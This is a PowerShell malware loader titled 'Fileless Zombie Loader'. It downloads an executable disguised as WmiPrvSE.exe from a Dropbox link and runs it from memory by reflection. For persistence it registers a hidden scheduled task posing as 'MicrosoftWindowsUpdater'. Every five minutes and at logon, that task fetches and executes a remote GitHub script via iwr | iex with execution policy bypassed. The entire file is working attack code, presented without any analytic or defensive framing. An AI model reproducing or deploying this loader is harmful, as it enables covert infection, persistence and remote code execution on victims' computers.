# ==========================================
# FILELESS ZOMBIE LOADER (RAM ONLY)
# ==========================================

# 1. SETTINGS
$PayloadUrl = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'
$LoaderUrl  = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/deploy%20invisible.ps1'
$TaskName   = "MicrosoftWindowsUpdater"

# 2. FILELESS EXECUTION (The "First Step")
# Tries to run the payload in memory without touching the disk.
function Run-Fileless {
    try {
        # Download bytes to RAM
        $wc = New-Object System.Net.WebClient
        $bytes = $wc.DownloadData($PayloadUrl)
        
        # Load into Memory (Reflection)
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        
        # Run the EXE from Memory
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint) {
            $entryPoint.Invoke($null, $null)
        }
    } catch {
        # If execution fails (or runs continuously), just exit quietly.
        # This catch block keeps the script from crashing nicely.
    }
}

# 3. PERSISTENCE CHECK (The "Zombie" Loader)
# Checks if the persistence task exists. If not, it creates it.
$TaskExists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

if (-not $TaskExists) {
    # Create the Action: Run PowerShell -> Download GitHub Script -> Run It
    # We use single quotes inside double quotes to handle syntax correctly.
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr '$LoaderUrl' | iex`""
    
    # Triggers: At Startup AND Every 5 Minutes
    $Trigger1 = New-ScheduledTaskTrigger -AtLogon
    $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
    
    # Settings: Run as USERS (Interactive), Hidden, Highest Privileges
    $Principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
    $Settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
    
    # Register the Task
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
}

# 4. EXECUTE
# Run the fileless payload now.
Run-Fileless
